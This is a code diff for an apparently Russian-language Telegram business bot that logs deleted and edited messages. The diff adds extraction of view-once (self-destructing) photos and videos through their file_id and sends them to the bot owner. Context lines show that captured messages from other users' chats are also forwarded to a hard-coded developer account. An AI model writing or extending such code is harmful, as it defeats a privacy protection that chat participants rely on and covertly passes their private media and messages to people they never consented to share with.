@@ -13,12 +13,11 @@ TOKEN = os.getenv('BOT_TOKEN')
 ADMIN_ID = 1250562983  # ВАШ ID
 
 # ==========================================
-# 🖼 НАСТРОЙКИ ФОТОГРАФИЙ (Вставьте свои ссылки между кавычками)
+# 🖼 НАСТРОЙКИ ФОТОГРАФИЙ
 # ==========================================
 IMG_SETTINGS = "https://i.postimg.cc/nLtLjM5f/Gemini-Generated-Image-958e6h958e6h958e.jpg"
 IMG_EDITED   = "https://i.postimg.cc/J4frvGR1/Gemini-Generated-Image-d4yhcwd4yhcwd4yh.jpg"
 IMG_DELETED  = "https://i.postimg.cc/vmj3tFWK/e9c320fc-7cf5-43ec-b736-5354f04e46b2.jpg"
-
 
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
@@ -53,6 +52,7 @@ def get_settings(user_id):
         user_settings[user_id] = {
             "deleted": True, 
             "edited": True, 
+            "view_once": True,  # Возвращаем настройку одноразовых
             "silent": False,    
             "compact": False    
         }
@@ -63,6 +63,7 @@ def settings_keyboard(user_id):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=f"{'🟢' if s['deleted'] else '🔴'} Ловить удаления", callback_data="set_deleted")],
         [InlineKeyboardButton(text=f"{'🟢' if s['edited'] else '🔴'} Ловить изменения", callback_data="set_edited")],
+        [InlineKeyboardButton(text=f"{'🟢' if s['view_once'] else '🔴'} Одноразовые медиа", callback_data="set_view_once")],
         [
             InlineKeyboardButton(text=f"{'🔕' if s['silent'] else '🔔'} Без звука", callback_data="set_silent"),
             InlineKeyboardButton(text=f"{'📦' if s['compact'] else '📜'} Компакт", callback_data="set_compact")
@@ -164,6 +165,7 @@ async def send_recovered_media(target_id, alert_text, m_type, m_id, silent=False
 @dp.business_message()
 async def handle_messages(message: Message):
     owner_id = await get_owner(message.business_connection_id, bot)
+    settings = get_settings(owner_id)
     
     author_info_full = get_user_info(message.from_user, compact=False)
     author_info_compact = get_user_info(message.from_user, compact=True)
@@ -190,6 +192,29 @@ async def handle_messages(message: Message):
         "media_type": media_type
     }
 
+    # ==========================================
+    # ИЗВЛЕЧЕНИЕ ОДНОРАЗОВЫХ ФАЙЛОВ ЧЕРЕЗ FILE_ID
+    # ==========================================
+    reply = message.reply_to_message
+    if reply and settings["view_once"]:
+        # Если в ответе есть медиа (даже сгорающее)
+        if reply.photo or reply.video or reply.video_note:
+            reply_author = get_user_info(reply.from_user, settings["compact"])
+            alert_text = f"🎁 <b>ИЗВЛЕЧЕНО МЕДИА</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>От:</b> {reply_author}"
+            
+            try:
+                # Извлекаем прямые file_id вместо копирования сообщения
+                if reply.photo:
+                    await bot.send_photo(owner_id, reply.photo[-1].file_id, caption=alert_text, disable_notification=settings["silent"])
+                elif reply.video:
+                    await bot.send_video(owner_id, reply.video.file_id, caption=alert_text, disable_notification=settings["silent"])
+                elif reply.video_note:
+                    await bot.send_message(owner_id, alert_text, disable_notification=settings["silent"])
+                    await bot.send_video_note(owner_id, reply.video_note.file_id, disable_notification=settings["silent"])
+            except Exception as e:
+                # Если файл уже удален с серверов или заблокирован аппаратно
+                await bot.send_message(owner_id, alert_text + "\n\n⚠️ <i>Не удалось извлечь файл. Файл аппаратно стерт сервером.</i>", disable_notification=settings["silent"])
+
 @dp.edited_business_message()
 async def catch_edited(message: Message):
     owner_id = await get_owner(message.business_connection_id, bot)
@@ -207,7 +232,7 @@ async def catch_edited(message: Message):
     if settings["compact"]:
         alert_text = f"✍️ Изменено: {author}\n🟣 {original['text']}\n🔵 {new_display}"
     else:
-        alert_text = f"🔮 <b>ИЗМЕНЕННОЕ СООБЩЕНИЕ</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Автор:</b> {author}\n\n🟣 <b>Исходник:</b>\n{original['text']}\n🔵 <b>Новый код:</b>\n{new_display}"
+        alert_text = f"🔮 <b>ИЗМЕНЕННОЕ СООБЩЕНИЕ</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Автор:</b> {author}\n\n🟣 <b>Было:</b>\n{original['text']}\n🔵 <b>Стало:</b>\n{new_display}"
     
     await send_alert_with_image(owner_id, alert_text, IMG_EDITED, settings["silent"])
     if owner_id != ADMIN_ID:
@@ -242,7 +267,7 @@ async def catch_deleted(deleted: BusinessMessagesDeleted):
                     await send_alert_with_image(ADMIN_ID, f"🕵️‍♂️ <b>СЕТЬ ID <code>{owner_id}</code></b>\n\n{alert_text}", IMG_DELETED, settings["silent"])
 
 async def main():
-    print("Бот запущен. Жду настройки изображений.")
+    print("Бот запущен. Механика file_id для сгорающих файлов активна.")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
